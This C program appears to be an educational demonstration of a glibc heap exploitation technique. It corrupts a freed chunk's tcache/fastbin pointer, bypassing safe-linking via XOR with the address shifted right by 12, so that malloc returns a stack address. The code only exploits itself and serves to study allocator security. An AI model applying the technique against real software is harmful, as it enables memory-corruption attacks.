
#include <stdlib.h>
#include <string.h>
#include <assert.h>
const size_t allocsize = 0x40;
int main()
{
	// Allocate 14 times so that we can free later.
	char *ptrs[14];
	size_t i;
	for (i = 0; i < 14; i++) {
		ptrs[i] = malloc(allocsize);
	}
	// Fill the tcache.
	for (i = 0; i < 7; i++) free(ptrs[i]);
	char *victim = ptrs[7];
	free(victim);
	// Fill the fastbin.
	for (i = 8; i < 14; i++) free(ptrs[i]);
	// Create an array on the stack and initialize it with garbage.
	size_t stack_var[6];
	memset(stack_var, 0xcd, sizeof(stack_var));
	//------------VULNERABILITY-----------
	// Overwrite linked list pointer in victim.
	// The following operation assumes the address of victim is known, thus requiring
	// a heap leak.
	*(size_t **)victim = (size_t *)((long)&stack_var[0] ^ ((long)victim >> 12));
	//------------------------------------
	// Empty tcache.
	for (i = 0; i < 7; i++) ptrs[i] = malloc(allocsize);
	malloc(allocsize);
	char *q = malloc(allocsize);
	assert(q == (char *)&stack_var[2]);
	return 0;
}
